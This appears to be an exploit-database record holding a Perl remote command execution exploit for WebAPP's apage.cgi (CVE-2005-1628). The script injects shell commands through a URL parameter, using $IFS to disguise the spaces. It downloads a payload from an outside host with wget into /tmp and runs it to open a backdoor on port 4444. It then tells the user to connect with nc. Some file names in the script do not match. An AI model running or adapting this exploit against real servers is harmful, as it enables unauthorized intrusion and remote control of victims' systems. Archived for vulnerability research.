{
  "id": "1005",
  "title": "WebAPP 0.9.9.2.1 - Remote Command Execution (1)",
  "cve": "CVE-2005-1628",
  "vuln_type": "unknown",
  "code": "!/usr/bin/perl\r\n#################################################################\r\n#                         T r a p - S e t   U n d e r G r o u n D   H a c k i n g   T e a m                               #\r\n#################################################################\r\n# Remote C0mmand Executing Expl0it - For WebAPP CGI\r\n#\r\n#Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v );\r\n#E-Mail : Alpha_Programmer@Yahoo.com\r\n#            Trapset_Sec@Yahoo.Ca\r\n#This xpl Open a Backdoor in 4444 Port with Nobody Access !!! All Of The *NIX OS that Have UnPatch\r\n#apage.cgi is Vulnerable in this M0ment !!\r\n#\r\n#################################################################\r\n#  Gr33tz To ==>  AlphaST.Com , Crouz.Com  , Simorgh-ev.Com  And  MH_P0rtal , Oil_Krachack     #\r\n#################################################################\r\nuse IO::Socket;\r\n\r\nif (@ARGV < 2)\r\n{\r\n print \"\\n==============================================\\n\";\r\n print \" \\n    WebAPP CGI Exploit By Alpha_Programmer \\n\\n\";\r\n print \"      Trap-Set Underground Hacking Team      \\n\\n\";\r\n print \"            Usage: <T4rg3t> <Dir>      \\n\\n\";\r\n print \"==============================================\\n\\n\";\r\n print \"Examples:\\n\\n\";\r\n print \"    WebApp.pl www.Host.com /cgi-bin/ \\n\";\r\n exit();\r\n}\r\n\r\n\r\n$serv = $ARGV[0];\r\n$serv =~ s/http:\\/\\///ge;\r\n\r\n$dir = $ARGV[1];\r\n\r\n$cmde = \"cd /tmp;wget http://www.khatotarh.com/NeT/alpha.txt\";\r\n\r\n$cmde =~ s/ /\"\\$IFS\"/ge;\r\n\r\n$req  = \"GET http://$serv\";\r\n$req .= \"$dir\";\r\n$req .= \"apage.cgi?f=file.htm.|echo\\$IFS\\\"_N_\\\";$cmde;echo\\$IFS\\\"_T_\\\"| HTTP/1.0\\n\\n\";\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>80) or die \" (-) - C4n't C0nn3ct To The S3rver\\n\";\r\n\r\nprint $sock $req;\r\nprint \"\\nPlease Wait ...\\n\\n\";\r\nsleep(3000);\r\nclose($sock);\r\n\r\n$sock2 = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>80) or die \" (-) - C4n't C0nn3ct To The S3rver\\n\";\r\n\r\n\r\n$cmde2 = \"cd /tmp;cp alpha.txt alpha.pl;chmod 777 sirus.pl;perl sirus.pl\";\r\n\r\n$cmde2 =~ s/ /\"\\$IFS\"/ge;\r\n\r\n$req2  = \"GET http://$serv\";\r\n$req2 .= \"$dir\";\r\n$req2 .= \"apage.cgi?f=file.htm.|echo\\$IFS\\\"_N_\\\";$cmde2;echo\\$IFS\\\"_T_\\\"| HTTP/1.0\\n\\n\";\r\n\r\nprint $sock2 $req2;\r\nprint \"\\n\\n$$$   OK -- Now Try: Nc -v www.host.com 4444   $$$\\n\";\r\nprint \"$$  if This Port was Close , This mean is That , You Hav'nt Permission to Write in /TMP  $$\\n\";\r\n\r\n### EOF ###\r\n\r\n\r\n# milw0rm.com [2005-05-20]",
  "url": "https://www.exploit-db.com/exploits/1005"
}